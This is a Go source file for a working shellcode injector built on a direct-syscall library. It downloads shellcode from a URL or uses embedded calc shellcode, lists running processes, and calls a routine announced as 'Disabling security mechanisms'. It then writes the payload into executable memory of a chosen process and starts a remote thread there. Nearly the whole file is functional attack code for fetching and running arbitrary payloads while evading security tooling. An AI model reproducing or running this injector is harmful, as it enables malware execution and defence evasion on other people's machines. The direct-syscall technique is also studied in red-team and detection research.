package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unsafe"

	winapi "github.com/carved4/go-direct-syscall"
)



// getEmbeddedShellcode returns the embedded calc shellcode as bytes
func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	
	// Convert hex string to bytes
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}



// Process information structure
type ProcessInfo struct {
	Pid  uint32
	Name string
}

// SyscallDumpResult represents the complete syscall dump for JSON export
type SyscallDumpResult struct {
	Timestamp   string                     `json:"timestamp"`
	SystemInfo  SystemInfo                 `json:"system_info"`
	Syscalls    []winapi.SyscallInfo       `json:"syscalls"`
	TotalCount  int                        `json:"total_count"`
}

// SystemInfo holds basic system information for the dump
type SystemInfo struct {
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	NtdllBase    string `json:"ntdll_base"`
}

// downloadPayload downloads shellcode from a URL
func downloadPayload(url string) ([]byte, error) {
	// Create HTTP client with reasonable timeout
	client := &http.Client{
		Timeout: 30 * 1000000000, // 30 seconds
	}
	
	// Make the request
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %v", err)
	}
	defer resp.Body.Close()
	
	// Check response code
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	// Read the payload
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}
	
	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
	return payload, nil
}

// utf16ToString converts a UTF16 string to Go string
func utf16ToString(ptr *uint16, maxLen int) string {
	if ptr == nil {
		return ""
	}
	
	var result []uint16
	for i := 0; i < maxLen; i++ {
		char := *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + uintptr(i)*2))
		if char == 0 {
			break
		}
		result = append(result, char)
	}
	
	// Simple conversion for ASCII characters
	var str strings.Builder
	for _, char := range result {
		if char < 128 {
			str.WriteByte(byte(char))
		} else {
			str.WriteRune('?') // Replace non-ASCII with ?
		}
	}
	return str.String()
}

// getProcessList retrieves a list of running processes using NtQuerySystemInformation
func getProcessList() ([]ProcessInfo, error) {
	// First call to get required buffer size
	var returnLength uintptr
	status, err := winapi.NtQuerySystemInformation(
		winapi.SystemProcessInformation,
		nil,
		0,
		&returnLength,
	)
	
	if status != winapi.STATUS_INFO_LENGTH_MISMATCH && status != winapi.STATUS_BUFFER_TOO_SMALL {
		return nil, fmt.Errorf("failed to get buffer size: %s", winapi.FormatNTStatus(status))
	}
	
	// Allocate buffer with some extra space
	bufferSize := returnLength + 4096
	buffer := make([]byte, bufferSize)
	
	// Second call to get actual data
	status, err = winapi.NtQuerySystemInformation(
		winapi.SystemProcessInformation,
		unsafe.Pointer(&buffer[0]),
		bufferSize,
		&returnLength,
	)
	
	if err != nil {
		return nil, fmt.Errorf("NtQuerySystemInformation error: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return nil, fmt.Errorf("NtQuerySystemInformation failed: %s", winapi.FormatNTStatus(status))
	}
	
	var processes []ProcessInfo
	offset := uintptr(0)
	processCount := 0
	
	for {
		// Safety check to prevent buffer overflow
		if offset >= uintptr(len(buffer)) {
			break
		}
		
		// Get current process entry
		processInfo := (*winapi.SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		processCount++
		
		// Extract process name from UNICODE_STRING
		var processName string
		if processInfo.ImageName.Buffer != nil && processInfo.ImageName.Length > 0 {
			maxChars := int(processInfo.ImageName.Length / 2) // Length is in bytes, convert to chars
			if maxChars > 260 { // MAX_PATH protection
				maxChars = 260
			}
			processName = utf16ToString(processInfo.ImageName.Buffer, maxChars)
		} else {
			// Handle System Idle Process (PID 0) which has no name
			if processInfo.UniqueProcessId == 0 {
				processName = "System Idle Process"
			} else {
				processName = fmt.Sprintf("Process_%d", processInfo.UniqueProcessId)
			}
		}
		

		
		// Skip System Idle Process (PID 0) but include all others
		if processInfo.UniqueProcessId != 0 && processName != "" {
			// Try to open the process to check if we have access
			// Use a more permissive access check - try different access levels
			var processHandle uintptr
			clientId := winapi.CLIENT_ID{
				UniqueProcess: processInfo.UniqueProcessId,
				UniqueThread:  0,
			}
			
			// Initialize OBJECT_ATTRIBUTES to NULL equivalent
			objAttrs := winapi.OBJECT_ATTRIBUTES{
				Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
			}
			
			// Try with limited access first
			status, _ := winapi.NtOpenProcess(
				&processHandle,
				winapi.PROCESS_QUERY_LIMITED_INFORMATION,
				uintptr(unsafe.Pointer(&objAttrs)),
				uintptr(unsafe.Pointer(&clientId)),
			)
			
			// If that fails, try with even more limited access
			if status != winapi.STATUS_SUCCESS {
				status, _ = winapi.NtOpenProcess(
					&processHandle,
					winapi.PROCESS_QUERY_INFORMATION,
					uintptr(unsafe.Pointer(&objAttrs)),
					uintptr(unsafe.Pointer(&clientId)),
				)
			}
			
			// If that still fails, just add the process anyway (we know it exists)

			if status == winapi.STATUS_SUCCESS {
				winapi.NtClose(processHandle)
			}
			

			
			// Add process to list even if we can't access it for injection
			// We'll check access again when actually trying to inject
			processes = append(processes, ProcessInfo{
				Pid:  uint32(processInfo.UniqueProcessId),
				Name: processName,
			})
		}
		
		// Move to next entry
		if processInfo.NextEntryOffset == 0 {
			break
		}
		offset += uintptr(processInfo.NextEntryOffset)
	}
	

	
	// Sort processes by name for easier readability
	sort.Slice(processes, func(i, j int) bool {
		return processes[i].Name < processes[j].Name
	})
	
	return processes, nil
}

// isProcessRunning checks if a process is still running using NtQueryInformationProcess
func isProcessRunning(pid uint32) error {
	// Open the process
	var processHandle uintptr
	clientId := winapi.CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}
	
	// Initialize OBJECT_ATTRIBUTES properly
	objAttrs := winapi.OBJECT_ATTRIBUTES{
		Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
	}
	
	status, err := winapi.NtOpenProcess(
		&processHandle,
		winapi.PROCESS_QUERY_LIMITED_INFORMATION,
		uintptr(unsafe.Pointer(&objAttrs)),
		uintptr(unsafe.Pointer(&clientId)),
	)
	
	if err != nil {
		return fmt.Errorf("failed to open process for verification: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("failed to open process: %s", winapi.FormatNTStatus(status))
	}
	
	defer winapi.NtClose(processHandle)
	
	// Query basic process information
	var processInfo winapi.PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	
	status, err = winapi.NtQueryInformationProcess(
		processHandle,
		winapi.ProcessBasicInformation,
		unsafe.Pointer(&processInfo),
		unsafe.Sizeof(processInfo),
		&returnLength,
	)
	
	if err != nil {
		return fmt.Errorf("failed to query process information: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("process query failed: %s", winapi.FormatNTStatus(status))
	}
	
	// If we can query the process, it's running
	// The ExitStatus would be non-zero if the process had exited
	return nil
}

func directSyscallInjector(payload []byte, pid uint32) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}

	// Verify process is running
	if err := isProcessRunning(pid); err != nil {
		return err
	}

	// Open target process
	var processHandle uintptr
	clientId := winapi.CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}
	
	// Initialize OBJECT_ATTRIBUTES properly
	objAttrs := winapi.OBJECT_ATTRIBUTES{
		Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
	}
	
	status, err := winapi.NtOpenProcess(
		&processHandle,
		winapi.PROCESS_ALL_ACCESS,
		uintptr(unsafe.Pointer(&objAttrs)),
		uintptr(unsafe.Pointer(&clientId)),
	)
	
	if err != nil {
		return fmt.Errorf("failed to open target process: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("failed to open target process: %s", winapi.FormatNTStatus(status))
	}
	
	defer winapi.NtClose(processHandle)

	// NtAllocateVirtualMemory using direct syscall library
	var remoteBuffer uintptr
	allocSize := uintptr(len(payload))
	
	status, err = winapi.NtAllocateVirtualMemory(
		processHandle,
		&remoteBuffer,
		0,
		&allocSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_EXECUTE_READWRITE,
	)

	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
	}

	fmt.Printf("Allocated memory at %#x, status: %s\n", remoteBuffer, winapi.FormatNTStatus(status))

	// NtWriteVirtualMemory using direct syscall library
	var bytesWritten uintptr
	
	status, err = winapi.NtWriteVirtualMemory(
		processHandle,
		remoteBuffer,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)

	if err != nil {
		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtWriteVirtualMemory failed: %s", winapi.FormatNTStatus(status))
	}

	if bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}

	fmt.Printf("Wrote %d bytes, status: %s\n", bytesWritten, winapi.FormatNTStatus(status))

	// NtCreateThreadEx using direct syscall library
	var hThread uintptr
	
	// NtCreateThreadEx requires ALL 11 parameters - Windows expects them all
	status, err = winapi.NtCreateThreadEx(
		&hThread,             // 1. ThreadHandle
		winapi.THREAD_ALL_ACCESS, // 2. DesiredAccess  
		0,                    // 3. ObjectAttributes (NULL)
		processHandle,        // 4. ProcessHandle
		remoteBuffer,         // 5. StartRoutine
		0,                    // 6. Argument (NULL)
		0,                    // 7. CreateFlags
		0,                    // 8. ZeroBits  
		0,                    // 9. StackSize
		0,                    // 10. MaximumStackSize
		0,                    // 11. AttributeList (NULL)
	)

	if err != nil {
		return fmt.Errorf("NtCreateThreadEx error: %v", err)
	}

	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("NtCreateThreadEx failed: %s", winapi.FormatNTStatus(status))
	}

	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))

	// Wait for the thread to complete (important for donut payloads that need time to execute)
	fmt.Printf("Waiting for thread to complete...\n")
	
	// Wait indefinitely for the thread to finish
	// Using nil timeout means wait forever
	waitStatus, err := winapi.NtWaitForSingleObject(hThread, false, nil)
	
	if err != nil {
		fmt.Printf("Warning: NtWaitForSingleObject error: %v\n", err)
	} else if waitStatus == winapi.STATUS_SUCCESS {
		fmt.Printf("Thread completed successfully: %s\n", winapi.FormatNTStatus(waitStatus))
	} else {
		fmt.Printf("Thread wait returned: %s\n", winapi.FormatNTStatus(waitStatus))
	}
	
	// Close the thread handle
	winapi.NtClose(hThread)

	return nil
}

func main() {

	// Prewarm the syscall cache :3
	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
		fmt.Printf("Warning: Failed to prewarm cache: %v\n", cacheErr)
	}

	
	// Display cache statistics
	stats := winapi.GetSyscallCacheStats()
	fmt.Printf("Syscall cache initialized - Size: %v, Algorithm: %v\n", 
		stats["cache_size"], stats["hash_algorithm"])
	
	// Parse command line flags
	urlFlag := flag.String("url", "", "URL to download shellcode from")
	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")

	flag.Parse()

	// Check if dump flag is used
	if *dumpFlag {
		fmt.Println("Dumping all available syscalls from ntdll.dll...")
		fmt.Println("=" + strings.Repeat("=", 79))
		
		// Demonstrate NT Status code formatting
		fmt.Println("\nNT Status Code Examples:")
		fmt.Println("------------------------")
		exampleStatuses := []uintptr{
			winapi.STATUS_SUCCESS,
			winapi.STATUS_INFO_LENGTH_MISMATCH,
			winapi.STATUS_INVALID_HANDLE,
			winapi.STATUS_INVALID_PARAMETER,
			winapi.STATUS_ACCESS_DENIED,
			winapi.STATUS_NO_MEMORY,
			0xC0000005, // STATUS_ACCESS_VIOLATION
			0xC000001C, // STATUS_INVALID_PARAMETER_1
		}
		
		for _, status := range exampleStatuses {
			fmt.Printf("  %s\n", winapi.FormatNTStatus(status))
		}
		fmt.Println()
		
		syscalls, err := winapi.DumpAllSyscallsWithFiles()
		if err != nil {
			fmt.Printf("Failed to dump syscalls: %v\n", err)
			os.Exit(1)
		}
		
		// Sort syscalls by syscall number for better readability
		sort.Slice(syscalls, func(i, j int) bool {
			return syscalls[i].SyscallNumber < syscalls[j].SyscallNumber
		})
		
		// Display to console
		fmt.Printf("%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
		fmt.Printf("%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
		
		for _, sc := range syscalls {
			fmt.Printf("%-4d %-40s 0x%-10X 0x%-14X\n", 
				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
		}
		
		fmt.Printf("\nTotal syscalls found: %d\n", len(syscalls))
		
		// Prepare data for JSON export
		ntdllBase := "0x0"
		if len(syscalls) > 0 {
			// Calculate ntdll base from first syscall address (rough estimate)
			firstAddr := syscalls[0].Address
			// Round down to nearest 64KB boundary (typical DLL alignment)
			baseAddr := firstAddr &^ 0xFFFF
			ntdllBase = fmt.Sprintf("0x%X", baseAddr)
		}
		
		dumpResult := SyscallDumpResult{
			Timestamp: time.Now().Format("2006-01-02T15:04:05Z07:00"),
			SystemInfo: SystemInfo{
				OS:           "Windows",
				Architecture: "x64",
				NtdllBase:    ntdllBase,
			},
			Syscalls:   syscalls,
			TotalCount: len(syscalls),
		}
		
		// Generate filename with timestamp
		filename := fmt.Sprintf("syscall_dump_%s.json", time.Now().Format("20060102_150405"))
		
		// Marshal to JSON with proper indentation
		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
		if err != nil {
			fmt.Printf("Failed to marshal JSON: %v\n", err)
			os.Exit(1)
		}
		
		// Write to file
		err = os.WriteFile(filename, jsonData, 0644)
		if err != nil {
			fmt.Printf("Failed to write JSON file: %v\n", err)
			os.Exit(1)
		}
		
		fmt.Printf("\n✓ Syscall dump saved to: %s\n", filename)
		fmt.Printf("✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
		return
	}

	var payload []byte
	var err error

	// Check if example flag is used
	if *exampleFlag {
		// Embedded calc shellcode
		payload = getEmbeddedShellcode()
		fmt.Printf("Using embedded calc shellcode (%d bytes)\n", len(payload))
		fmt.Printf("NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
	} else {
		// Check if URL is provided
		url := *urlFlag
		if url == "" {
			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
			fmt.Println("Usage:")
			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin")
			fmt.Println("  ./cmd.exe -example")
			fmt.Println("  ./cmd.exe -dump")
			os.Exit(1)
		}
		
		// Download the payload
		payload, err = downloadPayload(url)
		if err != nil {
			fmt.Printf("Failed to download payload: %v\n", err)
			return
		}
	}
	
	// Get list of accessible processes
	allProcesses, err := getProcessList()
	if err != nil {
		fmt.Printf("Failed to get process list: %v\n", err)
		return
	}
	
	// Always filter out system processes for cleaner user experience
	systemProcesses := []string{
		"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
		"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe",
		"fontdrvhost.exe", "sihost.exe", "taskhostw.exe", "conhost.exe",
		"dllhost.exe", "ctfmon.exe", "perfhost.exe", "audiodg.exe",
		"runtimebroker.exe", "searchindexer.exe", "searchfilterhost.exe",
		"searchprotocolhost.exe", "searchapp.exe", "startmenuexperiencehost.exe",
		"shellexperiencehost.exe", "textinputhost.exe", "applicationframehost.exe",
		"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
		"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
	}
	
	var processes []ProcessInfo
	for _, proc := range allProcesses {
		isSystem := false
		for _, sysProc := range systemProcesses {
			if strings.EqualFold(proc.Name, sysProc) {
				isSystem = true
				break
			}
		}
		if !isSystem {
			processes = append(processes, proc)
		}
	}
	
	if len(processes) == 0 {
		fmt.Println("No user processes found.")
		return
	}
	
	fmt.Printf("Showing %d user processes (system processes hidden :3)\n", len(processes))
	
	var selectedProcess ProcessInfo
	
	if *exampleFlag {
		// Auto-select a safe process for example mode
		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe"}
		
		// First try to find a known safe process
		found := false
		for _, safeProc := range safeProcesses {
			for _, proc := range processes {
				if strings.EqualFold(proc.Name, safeProc) {
					selectedProcess = proc
					found = true
					fmt.Printf("Auto-selected safe process: %s (PID: %d)\n", proc.Name, proc.Pid)
					break
				}
			}
			if found {
				break
			}
		}
		
		// If no known safe process found, use the first non-system process
		if !found {
			// Skip common system processes
			systemProcesses := []string{"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", 
				"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe"}
			
			for _, proc := range processes {
				isSystem := false
				for _, sysProc := range systemProcesses {
					if strings.EqualFold(proc.Name, sysProc) {
						isSystem = true
						break
					}
				}
				if !isSystem {
					selectedProcess = proc
					found = true
					fmt.Printf("Auto-selected process: %s (PID: %d)\n", proc.Name, proc.Pid)
					break
				}
			}
		}
		
		if !found {
			fmt.Println("No suitable safe process found for auto-injection")
			return
		}
	} else {
		// Display process list for manual selection when using URL
		fmt.Println("\nAvailable processes:")
		fmt.Println("-------------------")
		for i, proc := range processes {
			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
		}
		
		// Prompt user to select a process
		var selectedIndex int
		for {
			fmt.Print("\nEnter process number to inject into: ")
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				input := strings.TrimSpace(scanner.Text())
				
				// Parse the input
				index, err := strconv.Atoi(input)
				if err != nil || index < 1 || index > len(processes) {
					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
					continue
				}
				
				selectedIndex = index - 1
				break
			}
			
			if err := scanner.Err(); err != nil {
				fmt.Printf("Error reading input: %v\n", err)
				return
			}
		}
		
		// Get the selected process
		selectedProcess = processes[selectedIndex]
		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
	}

	
	// Apply security patches before injection
	fmt.Println("Disabling security mechanisms...")
	successful, failed := winapi.ApplyAllPatches()
	
	// Report patch results
	for _, name := range successful {
		fmt.Printf("Patching %s... SUCCESS\n", name)
	}
	for name, err := range failed {
		fmt.Printf("Patching %s... FAILED: %v\n", name, err)
	}
	
	if len(successful) > 0 {
		fmt.Printf("Successfully applied %d/%d security patches\n", len(successful), len(successful)+len(failed))
	}
	
	// Perform the injection
	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
	err = directSyscallInjector(payload, selectedProcess.Pid)
	
	if err != nil {
		fmt.Printf("Injection failed: %v\n", err)
	} else {
		fmt.Println("Injection Successful")
	}
}
